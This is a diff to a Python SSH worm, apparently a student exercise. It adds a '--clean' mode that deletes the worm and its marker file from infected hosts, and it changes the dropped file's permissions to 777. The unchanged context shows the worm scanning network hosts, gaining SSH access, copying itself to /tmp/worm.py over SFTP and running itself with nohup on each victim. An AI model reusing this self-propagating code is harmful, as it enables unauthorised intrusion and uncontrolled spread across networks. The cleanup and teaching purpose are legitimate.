@@ -45,7 +45,7 @@ def spreadAndExecute(sshClient):
 	sftpClient.put(current_path, "/tmp/worm.py")
 	
 	#Change permissions
-	sshClient.exec_command("chmod 555 /tmp/worm.py")
+	sshClient.exec_command("chmod 777 /tmp/worm.py")
 
 	#Run the code
 	sshClient.exec_command("nohup python3 /tmp/worm.py")
@@ -174,11 +174,14 @@ def getifip():
 
 #++++++++++++++++++++++ MAIN +++++++++++++++++++++++++++#
 
-if len(sys.argv) < 2:
+if len(sys.argv) < 3:
 	
 	# TODO: If we are running on the victim, check if 
 	# the victim was already infected. If so, terminate.
 	# Otherwise, proceed with malice. 
+	clean = False
+	if sys.argv[1] in ('-c', '--clean'):
+		clean = True
 	if isInfectedSystem():
 		sys.exit()
 	else:
@@ -192,7 +195,7 @@ if len(sys.argv) < 2:
 
 		#Remove the IP of the current system
 		#from the list of discovered systems (We do not want to target ourselves!).
-		if ip in networkHosts:
+		if ip in networkHosts and not clean:
 			networkHosts.remove(ip)
 
 		print("Found hosts", networkHosts)
@@ -206,20 +209,38 @@ if len(sys.argv) < 2:
 
 			# Did the attack succeed?
 			if sshInfo:
-				print("Trying to spread")
-				infected = None
-				try:
-					sftp = sshInfo[0].open_sftp()
-					#Check if infected.txt exists
-					infected = sftp.file(INFECTED_MARKER_FILE, 'r')
-					sftp.close()
-				except IOError:
-					print("Get this system infected")
-					spreadAndExecute(sshInfo[0])
-					print("Spreading complete!")
-				if infected:
-					print(f"{host} is already infected")
+				if not clean:
+					print("Trying to spread")
+					infected = None
+					try:
+						sftp = sshInfo[0].open_sftp()
+						#Check if infected.txt exists
+						infected = sftp.file(INFECTED_MARKER_FILE, 'r')
+						sftp.close()
+					except IOError:
+						print("Get this system infected")
+						spreadAndExecute(sshInfo[0])
+						print("Spreading complete!")
+					if infected:
+						print(f"{host} is already infected")
 
+				else:
+					print("Trying to clean")
+					infected = None
+					worm = None
+					try:
+						sftp = sshInfo[0].open_sftp()
+						#Check if infected.txt exists
+						infected = sftp.file(INFECTED_MARKER_FILE, 'r')
+						worm = sftp.file("/tmp/worm.py",'r')
+						sftp.close()
+					except IOError:
+						print("This system is not infected")
+					if infected and worm:
+						print(f"{host} is infected\n")
+						print(f"Cleaning {host} \n")
+						sshInfo[0].exec_command("rm /tmp/infected.txt")
+						sshInfo[0].exec_command("rm /tmp/worm.py")
 			#Close the SSH session
 			sshInfo[0].close()
 
